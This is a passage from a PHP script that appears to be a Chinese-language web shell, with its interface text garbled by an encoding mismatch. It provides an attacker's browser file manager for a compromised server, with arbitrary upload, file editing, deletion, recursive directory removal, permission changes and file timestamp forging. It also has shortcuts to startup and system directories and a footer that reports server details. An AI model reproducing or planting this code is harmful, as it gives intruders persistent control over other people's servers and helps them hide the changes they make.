        echo base64_decode('PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+DQp2YXIgbiA9IDA7DQpmdW5jdGlvbiBzZWFyY2goc3RyKSB7DQoJdmFyIHR4dCwgaSwgZm91bmQ7DQoJaWYoc3RyID09ICIiKSByZXR1cm4gZmFsc2U7DQoJdHh0ID0gJCgnZmlsZWNvZGUnKS5jcmVhdGVUZXh0UmFuZ2UoKTsNCglmb3IoaSA9IDA7IGkgPD0gbiAmJiAoZm91bmQgPSB0eHQuZmluZFRleHQoc3RyKSkgIT0gZmFsc2U7IGkrKyl7DQoJCXR4dC5tb3ZlU3RhcnQoImNoYXJhY3RlciIsIDEpOw0KCQl0eHQubW92ZUVuZCgidGV4dGVkaXQiKTsNCgl9DQoJaWYoZm91bmQpeyB0eHQubW92ZVN0YXJ0KCJjaGFyYWN0ZXIiLCAtMSk7IHR4dC5maW5kVGV4dChzdHIpOyB0eHQuc2VsZWN0KCk7IHR4dC5zY3JvbGxJbnRvVmlldygpOyBuKys7IH0NCgllbHNlIHsgaWYgKG4gPiAwKSB7IG4gPSAwOyBzZWFyY2goc3RyKTsgfSBlbHNlIGFsZXJ0KHN0ciArICIuLi4gTm90LUZpbmQiKTsgfQ0KCXJldHVybiBmYWxzZTsNCn0NCjwvc2NyaXB0Pg==');
        echo '<div class="msgbox"><input name="keyword" id="keyword" type="text" style="width:138px;height:15px;"><input type="button" value="IE��������" onclick="search($(\'keyword\').value);"> - ' . $msg . '</div>';
        echo '<form name="editfrm" id="editfrm" method="POST">';
        subeval();
        echo '<input type="hidden" name="go" value=""><input type="hidden" name="act" id="act" value="edit">';
        echo '<input type="hidden" name="dir" id="dir" value="' . dirname($file) . '">';
        echo '<div class="actall">�ļ� <input type="text" name="filename" value="' . $file . '" style="width:528px;"> ';
        if ($iconv) {
            echo '���� <select name="tostr">';
            $selects = array(
                'normal' => 'Ĭ��',
                'utf' => 'utf-8'
            );
            foreach ($selects as $var => $name) {
                echo '<option value="' . $var . '"' . ($name == $chst ? ' selected' : '') . '>' . $name . '</option>';
            }
            echo '</select>';
        }
        echo '</div><div class="actall"><textarea name="filecode" id="filecode" style="width:698px;height:358px;">' . htmlspecialchars($code) . '</textarea></div></form>';
        echo '<div class="actall" style="padding:5px;padding-right:68px;"><input type="button" onclick="$(\'editfrm\').submit();" value="����" style="width:80px;"> ';
        echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="' . dirname($file) . '">';
        subeval();
        echo '<input type="button" onclick="$(\'backfrm\').submit();" value="����" style="width:80px;"></form></div>';
        break;
    case "upfiles":
        $updir = isset($_POST['updir']) ? $_POST['updir'] : $_POST['godir'];
        $msg   = '������ϴ��ļ� ' . get_cfg_var("upload_max_filesize") . '�� ��POST����ύ���� ' . get_cfg_var("post_max_size") . '��';
        $max   = 10;
        if (isset($_FILES['uploads']) && isset($_POST['renames'])) {
            $uploads = $_FILES['uploads'];
            $msgs    = array();
            for ($i = 1; $i < $max; $i++) {
                if ($uploads['error'][$i] == UPLOAD_ERR_OK) {
                    $rename   = $_POST['renames'][$i] == '' ? $uploads['name'][$i] : $_POST['renames'][$i];
                    $filea    = $uploads['tmp_name'][$i];
                    $fileb    = strdir($updir . '/' . $rename);
                    $msgs[$i] = fileu($filea, $fileb) ? '<br><h2>�ϴ��ɹ� ' . $rename . '</h2>' : '<br><h1>�ϴ�ʧ�� ' . $rename . '</h1>';
                }
            }
        }
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form name="upsfrm" id="upsfrm" method="POST" enctype="multipart/form-data">';
        subeval();
        echo '<input type="hidden" name="go" value="upfiles"><input type="hidden" name="act" id="act" value="upload">';
        echo '<div class="actall"><p>�ϴ���Ŀ¼ <input type="text" name="updir" style="width:398px;" value="' . $updir . '"></p>';
        for ($i = 1; $i < $max; $i++) {
            echo '<p>����' . $i . ' <input type="file" name="uploads[' . $i . ']" style="width:300px;"> ������ <input type="text" name="renames[' . $i . ']" style="width:128px;"> ' . $msgs[$i] . '</p>';
        }
        echo '</div></form><div class="actall" style="padding:8px;padding-right:68px;"><input type="button" onclick="$(\'upsfrm\').submit();" value="�ϴ�" style="width:80px;"> ';
        echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="' . $updir . '">';
        subeval();
        echo '<input type="button" onclick="$(\'backfrm\').submit();" value="����" style="width:80px;"></form></div>';
        break;
    default:
        if (isset($_FILES['upfile'])) {
            if ($_FILES['upfile']['name'] == '') {
                $msg = '<h1>��ѡ���ļ�</h1>';
            } else {
                $rename = $_POST['rename'] == '' ? $_FILES['upfile']['name'] : $_POST['rename'];
                $filea  = $_FILES['upfile']['tmp_name'];
                $fileb  = strdir($nowdir . $rename);
                $msg    = fileu($filea, $fileb) ? '<h2>�ϴ��ļ�' . $rename . '�ɹ�</h2>' : '<h1>�ϴ��ļ�' . $rename . 'ʧ��</h1>';
            }
        }
        if (isset($_POST['act'])) {
            switch ($_POST['act']) {
                case "a":
                    if (!$_POST['files']) {
                        $msg = '<h1>��ѡ���ļ� ' . $_POST['var'] . '</h1>';
                    } else {
                        $i = 0;
                        foreach ($_POST['files'] as $filename) {
                            $i += @copy(strdir($nowdir . $filename), strdir($_POST['var'] . '/' . $filename)) ? 1 : 0;
                        }
                        $msg = $msg = $i ? '<h2>������ ' . $i . ' ���ļ���' . $_POST['var'] . '�ɹ�</h2>' : '<h1>������ ' . $i . ' ���ļ���' . $_POST['var'] . 'ʧ��</h1>';
                    }
                    break;
                case "b":
                    if (!$_POST['files']) {
                        $msg = '<h1>��ѡ���ļ�</h1>';
                    } else {
                        $i = 0;
                        foreach ($_POST['files'] as $filename) {
                            $i += @unlink(strdir($nowdir . $filename)) ? 1 : 0;
                        }
                        $msg = $i ? '<h2>��ɾ�� ' . $i . ' ���ļ��ɹ�</h2>' : '<h1>��ɾ�� ' . $i . ' ���ļ�ʧ��</h1>';
                    }
                    break;
                case "c":
                    if (!$_POST['files']) {
                        $msg = '<h1>��ѡ���ļ� ' . $_POST['var'] . '</h1>';
                    } elseif (!ereg("^[0-7]{4}$", $_POST['var'])) {
                        $msg = '<h1>����ֵ����</h1>';
                    } else {
                        $i = 0;
                        foreach ($_POST['files'] as $filename) {
                            $i += @chmod(strdir($nowdir . $filename), base_convert($_POST['var'], 8, 10)) ? 1 : 0;
                        }
                        $msg = $i ? '<h2>�� ' . $i . ' ���ļ��޸�����Ϊ' . $_POST['var'] . '�ɹ�</h2>' : '<h1>�� ' . $i . ' ���ļ��޸�����Ϊ' . $_POST['var'] . 'ʧ��</h1>';
                    }
                    break;
                case "d":
                    if (!$_POST['files']) {
                        $msg = '<h1>��ѡ���ļ� ' . $_POST['var'] . '</h1>';
                    } elseif (!preg_match('/(\d+)-(\d+)-(\d+) (\d+):(\d+):(\d+)/', $_POST['var'])) {
                        $msg = '<h1>ʱ���ʽ���� ' . $_POST['var'] . '</h1>';
                    } else {
                        $i = 0;
                        foreach ($_POST['files'] as $filename) {
                            $i += @touch(strdir($nowdir . $filename), strtotime($_POST['var'])) ? 1 : 0;
                        }
                        $msg = $i ? '<h2>�� ' . $i . ' ���ļ��޸�ʱ��Ϊ' . $_POST['var'] . '�ɹ�</h2>' : '<h1>�� ' . $i . ' ���ļ��޸�ʱ��Ϊ' . $_POST['var'] . 'ʧ��</h1>';
                    }
                    break;
                case "e":
                    $path = strdir($nowdir . $_POST['var'] . '/');
                    if (file_exists($path)) {
                        $msg = '<h1>Ŀ¼�Ѵ��� ' . $_POST['var'] . '</h1>';
                    } else {
                        $msg = @mkdir($path, 0777) ? '<h2>����Ŀ¼ ' . $_POST['var'] . ' �ɹ�</h2>' : '<h1>����Ŀ¼ ' . $_POST['var'] . ' ʧ��</h1>';
                    }
                    break;
                case "rf":
                    $files = explode('|x|', $_POST['var']);
                    if (count($files) != 2) {
                        $msg = '<h1>�������</h1>';
                    } else {
                        $msg = @rename(strdir($nowdir . $files[1]), strdir($nowdir . $files[0])) ? '<h2>������ ' . $files[1] . ' Ϊ ' . $files[0] . ' �ɹ�</h2>' : '<h1>������ ' . $files[1] . ' Ϊ ' . $files[0] . ' ʧ��</h1>';
                    }
                    break;
                case "pd":
                    $files = explode('|x|', $_POST['var']);
                    if (count($files) != 2) {
                        $msg = '<h1>�������</h1>';
                    } else {
                        $path = strdir($nowdir . $files[1]);
                        $msg  = @chmod($path, base_convert($files[0], 8, 10)) ? '<h2>�޸�' . $files[1] . '����Ϊ' . $files[0] . '�ɹ�</h2>' : '<h1>�޸�' . $files[1] . '����Ϊ' . $files[0] . 'ʧ��</h1>';
                    }
                    break;
                case "edit":
                    if (isset($_POST['filename']) && isset($_POST['filecode'])) {
                        if ($_POST['tostr'] == 'utf') {
                            $_POST['filecode'] = @iconv('GB2312//IGNORE', 'UTF-8', $_POST['filecode']);
                        }
                        $msg = filew($_POST['filename'], $_POST['filecode'], 'w') ? '<h2>����ɹ� ' . $_POST['filename'] . '</h2>' : '<h1>����ʧ�� ' . $_POST['filename'] . '</h1>';
                    }
                    break;
                case "deltree":
                    $deldir = strdir($nowdir . $_POST['var'] . '/');
                    if (!file_exists($deldir)) {
                        $msg = '<h1>Ŀ¼ ' . $_POST['var'] . ' ������</h1>';
                    } else {
                        $msg = deltree($deldir) ? '<h2>ɾ��Ŀ¼ ' . $_POST['var'] . ' �ɹ�</h2>' : '<h1>ɾ��Ŀ¼ ' . $_POST['var'] . ' ʧ��</h1>';
                    }
                    break;
            }
        }
        $array   = showdir($nowdir);
        $thisurl = strdir('/' . strtr($nowdir, array(
            ROOTDIR => ''
        )) . '/');
        $chown   = substr(decoct(fileperms($nowdir)), -4);
        if (!$chown) {
            $chown = '0000';
        }
        $nowdir = strtr($nowdir, array(
            '\'' => '%27',
            '"' => '%22'
        ));
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<div class="actall"><form name="frm" id="frm" method="POST">';
        subeval();
        echo '��ǰ·��(' . $chown . ') <input type="text" name="dir" id="dir" style="width:500px;" value="' . strdir($nowdir . '/') . '"> ';
        echo '<input type="button" onclick="$(\'frm\').submit();" style="width:50px;" value="ת��"> ';
        echo '<select onchange="cd(options[selectedIndex].value);">';
        echo '<option>---����Ŀ¼---</option>';
        echo '<option value="' . ROOTDIR . '"> ��վ��Ŀ¼ </option>';
        echo '<option value="' . THISDIR . '"> ������Ŀ¼ </option>';
        echo '<option value="C:/RECYCLER/">Win-RECYCLER</option>';
        echo '<option value="C:/$Recycle.Bin/">Win-$Recycle</option>';
        echo '<option value="C:/Program Files/">Win-Program</option>';
        echo '<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup/">Win-Startup</option>';
        echo '<option value="C:/Documents and Settings/All Users/����ʼ���˵�/����/����/">Win-����</option>';
        echo '<option value="C:/Windows/Temp/">Win-TEMP</option>';
        echo '<option value="/usr/local/">Linux-local</option>';
        echo '<option value="/tmp/">Linux-tmp</option>';
        echo '<option value="/etc/">Linux-etc</option>';
        echo '</select></form></div><div class="actall">';
        echo '<input type="button" value="�½��ļ�" onclick="nf(\'edit\',\'newfile.php\');" style="width:80px;"> ';
        echo '<input type="button" value="����Ŀ¼" onclick="txts(\'Ŀ¼��\',\'newdir\',\'e\');" style="width:80px;"> ';
        echo '<input type="button" value="�����ϴ�" onclick="go(\'upfiles\',\'' . $nowdir . '\');" style="width:80px;"> ';
        echo '<form name="upfrm" id="upfrm" method="POST" enctype="multipart/form-data">';
        subeval();
        echo '<input type="hidden" name="dir" id="dir" value="' . $nowdir . '">';
        echo '<input type="file" name="upfile" style="width:256px;height:21px;"> ';
        echo '<input type="button" onclick="$(\'upfrm\').submit();" value="�ϴ�" style="width:50px;"> ';
        echo '�ϴ�������Ϊ <input type="text" name="rename" style="width:128px;">';
        echo '</form></div>';
        echo '<form name="frm1" id="frm1" method="POST"><table class="tables">';
        subeval();
        echo '<input type="hidden" name="dir" id="dir" value="' . $nowdir . '">';
        echo '<input type="hidden" name="act" id="act" value="">';
        echo '<input type="hidden" name="var" id="var" value="">';
        echo '<th><a href="javascript:void(0);" onclick="cd(\'' . dirname($nowdir) . '/\');">�ϼ�Ŀ¼</a></th><th style="width:8%">����</th><th style="width:5%">����</th><th style="width:17%">����ʱ��</th><th style="width:17%">�޸�ʱ��</th><th style="width:8%">����</th>';
        if ($array) {
            asort($array['dir']);
            asort($array['file']);
            $dnum = $fnum = 0;
            foreach ($array['dir'] as $path => $name) {
                $prem  = substr(decoct(fileperms($path)), -4);
                $ctime = date('Y-m-d H:i:s', filectime($path));
                $mtime = date('Y-m-d H:i:s', filemtime($path));
                echo '<tr>';
                echo '<td><a href="javascript:void(0);" onclick="cd(\'' . $nowdir . $name . '\');"><b>' . strtr($name, array(
                    '%27' => '\'',
                    '%22' => '"'
                )) . '</b></a></td>';
                echo '<td><a href="javascript:void(0);" onclick="dels(\'' . $name . '\');">ɾ��</a> ';
                echo '<a href="javascript:void(0);" onclick="acts(\'' . $name . '\',\'rf\',\'' . $name . '\');">����</a></td>';
                echo '<td><a href="javascript:void(0);" onclick="acts(\'' . $prem . '\',\'pd\',\'' . $name . '\');">' . $prem . '</a></td>';
                echo '<td>' . $ctime . '</td>';
                echo '<td>' . $mtime . '</td>';
                echo '<td>-</td>';
                echo '</tr>';
                $dnum++;
            }
            foreach ($array['file'] as $path => $name) {
                $prem  = substr(decoct(fileperms($path)), -4);
                $ctime = date('Y-m-d H:i:s', filectime($path));
                $mtime = date('Y-m-d H:i:s', filemtime($path));
                $size  = size(filesize($path));
                echo '<tr>';
                echo '<td><input type="checkbox" name="files[]" value="' . $name . '"><a target="_blank" href="' . $thisurl . $name . '">' . strtr($name, array(
                    '%27' => '\'',
                    '%22' => '"'
                )) . '</a></td>';
                echo '<td><a href="javascript:void(0);" onclick="go(\'edit\',\'' . $name . '\');">�༭</a> ';
                echo '<a href="javascript:void(0);" onclick="acts(\'' . $name . '\',\'rf\',\'' . $name . '\');">����</a></td>';
                echo '<td><a href="javascript:void(0);" onclick="acts(\'' . $prem . '\',\'pd\',\'' . $name . '\');">' . $prem . '</a></td>';
                echo '<td>' . $ctime . '</td>';
                echo '<td>' . $mtime . '</td>';
                echo '<td align="right"><a href="javascript:void(0);" onclick="go(\'down\',\'' . $name . '\');">' . $size . '</a></td>';
                echo '</tr>';
                $fnum++;
            }
        }
        unset($array);
        echo '</table>';
        echo '<div class="actall" style="text-align:left;">';
        echo '<input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> ';
        echo '<input type="button" value="����" style="width:50px;" onclick=\'txts("����·��","' . $nowdir . '","a");\'> ';
        echo '<input type="button" value="ɾ��" style="width:50px;" onclick=\'dels("b");\'> ';
        echo '<input type="button" value="����" style="width:50px;" onclick=\'txts("����ֵ","0666","c");\'> ';
        echo '<input type="button" value="ʱ��" style="width:50px;" onclick=\'txts("�޸�ʱ��","' . $mtime . '","d");\'> ';
        echo 'Ŀ¼[' . $dnum . '] - �ļ�[' . $fnum . ']</div></form>';
        break;
}
?><div class="footag"><?php
echo php_uname() . '<br>' . $_SERVER['SERVER_SOFTWARE'];
?></div></div></div></body></html><?php
unset($array);
?>